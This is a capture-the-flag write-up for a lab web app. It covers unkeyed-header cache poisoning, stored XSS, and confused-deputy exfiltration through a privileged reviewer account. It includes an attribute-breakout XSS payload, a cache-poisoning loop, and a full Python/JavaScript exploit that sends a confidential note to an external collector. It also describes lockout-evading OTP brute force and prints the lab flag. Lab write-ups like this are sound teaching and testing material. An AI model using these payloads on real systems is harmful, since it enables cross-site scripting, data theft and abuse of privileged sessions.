# blackmesa-003 - BugForge

**Difficulty:** Hard
**Vulnerability:** Unkeyed-header web cache poisoning -> stored XSS -> confused-deputy exfiltration via an automated reviewer account
**Flag:** `bug{mU60ySwYNZehtjLvbIINfnkQpnPGEECQ}`

---

## Summary

MesaNet Access Panel is a multi-app portal (Secure Mail, Nexus notes, Rail Broadcasts) sitting behind a session-based login and a single `/gateway` proxy that forwards `{id, endpoint, data}` calls to per-app internal handlers. The Rail Broadcast Viewer renders whatever HTML its API returns directly into `innerHTML` with no escaping, unlike the mail and notes apps which both sanitize consistently. The endpoint behind that view, `/api/rail/display`, is a genuinely HTTP-cacheable route (`Cache-Control: public, max-age=60`, real `X-Cache` headers) that reflects an application-specific `X-Rail-Skin` request header straight into an HTML attribute in the cached response body - but the cache key does not include that header. Any authenticated request carrying a malicious header value poisons the shared 60-second cache entry for every subsequent viewer.

A "submit for review" action on the same page lets the current user flag a broadcast for the "Automated Oversight System." That system is not decorative: it is a real fourth account with confidential-level read access that actually renders the flagged view. Two full sessions were spent unable to observe any effect from that trigger, because the natural instinct is to have the injected script write its findings back into the initiating account's own notes or mail - and the reviewer account's writes happen entirely inside its own session, invisible to a lower-privileged account watching its own inbox. Redirecting the exfiltration to an external out-of-band collector instead of same-app storage immediately confirmed a second, distinct actor rendering the page and revealed the confidential note holding the flag.

---

## App Structure

| Endpoint | Notes |
|----------|-------|
| `POST /login` | JSON or form login, `operator:operator` seeded |
| `GET /` | Dashboard listing Mail, Nexus, Rail apps |
| `GET /apps/rail` | Rail Broadcast Viewer, reads `?view=` query param |
| `GET /api/rail/display` | Cached (60s) skin renderer, reflects `X-Rail-Skin` header |
| `GET /api/rail/current` | Separate, non-cacheable "current broadcast" slot |
| `POST /gateway` | Proxy to internal subsystems: `{id, endpoint, data}` |
| `.../api/rail/create` (via gateway) | Creates a broadcast announcement, `message` stored raw |
| `.../api/rail/review` (via gateway) | Submits `{view}` for automated review |
| `.../api/notes/list`, `.../api/notes/get` (via gateway) | Nexus notes, classification-gated reads |
| `GET /dev` | Rotating 6-digit OTP console (see Dead Ends) |

App UUIDs used with `/gateway` are read from an inline `APP_ID` constant on each app's own page, not from the `/dev` documentation, which lists placeholder values.

---

## Discovery

### Step 1 - Finding the unescaped sink

`apps/rail`'s inline script:

```js
const view = params.get('view') || 'current';
fetch('/api/rail/' + view)
  .then(r => r.json())
  .then(data => {
    document.getElementById('broadcast-content').innerHTML = data.html;
  });
```

`mail-client.js` and `nexus-client.js` both call an `escapeHtml()` helper on every rendered field. Rail is the one place that skips it. Creating a broadcast via `.../api/rail/create` with an HTML payload in `message` confirms it comes back completely unescaped from `.../api/rail/announcements`, but the client only ever requests `current` by default, and `current` is filtered server-side to a fixed seed pool - content created through `create` never appears there no matter what `created_by` value is sent.

### Step 2 - Finding the actual cacheable route

The `view` query parameter is not decorative - it selects the literal path segment appended to `/api/rail/`. Requesting `/api/rail/display` directly (a value never tried while only probing near `current`) returns:

```
Cache-Control: public, max-age=60
X-Cache: MISS
X-Cache-Age: 0
X-Cache-Expires: 60
X-Rail-Skin: default

{"html":"<div class=\"rail-display-panel\"><link rel=\"stylesheet\" href=\"/public/css/rail-default.css\">...
```

This is a real cache layer with genuine hit/miss headers, unlike every other route in the app (static assets are `max-age=0`, `current` has no cache headers at all).

### Step 3 - The unkeyed header

Sending a different, arbitrary `X-Rail-Skin` header value on the next request still returns `X-Cache: HIT` with the original `skin` value in the body - proof the header is reflected into the response but is not part of the cache key:

```
curl -H "X-Rail-Skin: CANARY123" .../api/rail/display
-> X-Cache: HIT, body still shows the previous request's skin value
```

Any authenticated request that lands on the exact moment the cache entry is a `MISS` gets to set the content every subsequent caller receives for the next 60 seconds.

### Step 4 - Building a working payload

The `skin` value is interpolated into `<link rel="stylesheet" href="/public/css/rail-{skin}.css">` with no escaping. Breaking out of the attribute:

```
X-Rail-Skin: x"><img src=x onerror="...">"<link rel="stylesheet" href="x
```

`x"` closes the `href` attribute early, `>` closes the `<link>` tag, and a bare `<img onerror=...>` follows. A `<script>` tag in the same position does not execute, since scripts inserted via `innerHTML` never run - only event-handler attributes like `onerror`/`onload` fire.

### Step 5 - Catching the poison window

Looping the same malicious request until the response header flips to `X-Cache: MISS` guarantees that exact request became the new cached entry:

```python
for _ in range(20):
    r = session.get(f"{BASE}/api/rail/display", headers={"X-Rail-Skin": PAYLOAD})
    if r.headers.get("X-Cache") == "MISS":
        break
```

Loading `/apps/rail?view=display` afterward in a real browser (curl does not execute JavaScript, a plain `GET` is not sufficient to prove the bug) confirmed the injected `onerror` handler ran in the viewer's own authenticated session.

### Step 6 - The review trigger is real, but the exfil target was wrong

`.../api/rail/review` with `{"view": "display"}` accepts any string and always returns a generic "submitted for review" message regardless of whether the referenced content is valid - which made it look like a pure no-op across a dozen submissions over two separate sessions, each time checking the initiating account's own notes and mail for a result. Nothing ever appeared there.

The fix was to stop trying to observe the effect from inside the app entirely. Pointing the injected script's exfiltration at an external collector instead of same-app storage:

```js
fetch('/gateway', {method:'POST', credentials:'include', headers:{'Content-Type':'application/json'},
  body: JSON.stringify({id: NEXUS_ID, endpoint:'/api/notes/get', data:{id:6}})})
  .then(r => r.text())
  .then(note6 => fetch('https://<collector>/hook', {method:'POST', mode:'no-cors', body: note6}));
```

produced two separate hits within seconds of submitting the review request: one from the tester's own browser confirming the injection point works, and a second, distinct request - different IP, different user agent, `referer: http://localhost:3000/`, no session cookie attached - which is the real reviewer account rendering the page server-side with its own credentials. Its response to `.../api/notes/get {id:6}` was a confidential-classification note the initiating account could never read on its own, containing the flag directly in the note body.

---

## Exploit

```python
import time, requests, json

BASE = "https://<lab-host>"
COLLECTOR = "https://<your-collector>/hook"
NEXUS_ID = "a7f3c4e9-8b2d-4a6f-9c1e-5d8a3b7f2c4e"
RAIL_ID = "f7d4e8b2-3a1c-4f9e-8b2d-1c5e7a9f3b6d"

EXFIL_JS = (
    "(async()=>{"
    f"const r=await fetch('/gateway',{{method:'POST',headers:{{'Content-Type':'application/json'}},"
    f"credentials:'include',body:JSON.stringify({{id:'{NEXUS_ID}',endpoint:'/api/notes/get',data:{{id:6}}}})}})"
    ".then(x=>x.text());"
    f"fetch('{COLLECTOR}',{{method:'POST',mode:'no-cors',body:r}});"
    "})()"
)
PAYLOAD = 'x"><img src=x onerror="' + EXFIL_JS + '"><link rel="stylesheet" href="x'

s = requests.Session()
s.post(f"{BASE}/login", json={"username": "operator", "password": "operator"})

for _ in range(20):
    r = s.get(f"{BASE}/api/rail/display", headers={"X-Rail-Skin": PAYLOAD})
    if r.headers.get("X-Cache") == "MISS":
        break
    time.sleep(1)

s.post(f"{BASE}/gateway", json={"id": RAIL_ID, "endpoint": "/api/rail/review", "data": {"view": "display"}})
# flag arrives at COLLECTOR within a few seconds, sent by the reviewer account's own session
```

---

## Dead Ends

| Attempt | Why it failed |
|---------|--------------|
| Poisoning `/api/rail/current` directly | That route's content selection is filtered to a fixed `created_by:system` seed pool and ignores everything created through the API, regardless of timestamp or priority |
| Classic unkeyed-header probing (`X-Forwarded-Host`, `X-Forwarded-Scheme`, `X-Original-URL`, etc.) against `/api/rail/current` and static assets | Wrong target entirely - the real cacheable, header-reflecting route was `/api/rail/display`, only reachable via a `view` value that was never guessed until it was tried directly |
| `<script>` tag in the injected HTML | Scripts inserted via `innerHTML` never execute; only event-handler attributes like `onerror` fire |
| Writing exfiltrated data back to the initiating account's own notes/mail | The reviewer account's writes happen in its own session and are invisible to a lower-privileged account watching its own inbox - this made a fully working trigger look like a dead endpoint across a dozen review submissions |
| Mass assignment (`ownerId`, `role`, `username` spoofing) and top-level `entitlements` object injection on `.../api/notes/get` | Server-side classification check is tied to the authenticated session, not to any client-suppliable field |
| Calling `.../api/notes/get` through the mail or rail app UUID instead of the notes app UUID | Gateway returns `Endpoint not found` - no cross-app routing confusion available |
| Array/type-juggling tricks on the `id` parameter | Produces a different error (`Note not found` vs `Insufficient permissions`) confirming lookup happens before the permission check, but never bypasses the check itself |
| Full 1,000,000-code array-stuffed brute force against `/dev/verify`, parallelized across many fresh sessions to reset the per-session lockout and cover the entire keyspace inside one 60-second rotation window | Complete coverage confirmed (zero request errors, zero payload-too-large responses), zero hits - this variant's verify handler does not perform the array/loose-equality membership check that makes the same technique work elsewhere, so `/dev` was a genuine dead end here rather than a budget problem |
| Guessed thematic credentials for the other two visible accounts | All failed; the real fourth, elevated account was never one of the two visible usernames in the first place |

---

## Root Cause

Two independent flaws combine into the full chain. First, `/api/rail/display` is a real HTTP-cacheable endpoint whose cache key omits the `X-Rail-Skin` request header even though that header's value is reflected unescaped into the cached HTML fragment - a textbook unkeyed-input cache poisoning primitive. Second, the "submit for review" workflow is a genuine confused-deputy path: it causes a separate, more privileged account to render attacker-controlled content with its own session and credentials. Because that account's resulting actions are entirely contained within its own session, the only way to observe them is to have the injected script exfiltrate to a channel outside the application altogether - relying on same-app storage the initiating account can read will always look like the trigger did nothing, even when it is working perfectly.

---

## CWE / OWASP

- **CWE-79**: Improper Neutralization of Input During Web Page Generation (stored XSS via an unescaped `innerHTML` sink)
- **CWE-441**: Unintended Proxy or Intermediary ("Confused Deputy") - the reviewer account renders and acts on attacker-supplied content using its own elevated privileges
- **CWE-525**: Use of a Cache Containing Sensitive Information Without Proper Cache Key Scoping - request header reflected into a shared cache entry that is not keyed on that header
- **OWASP A03:2021** - Injection
- **OWASP A01:2021** - Broken Access Control (confidential-classification content reachable only by tricking a higher-privileged session into acting on the attacker's behalf)
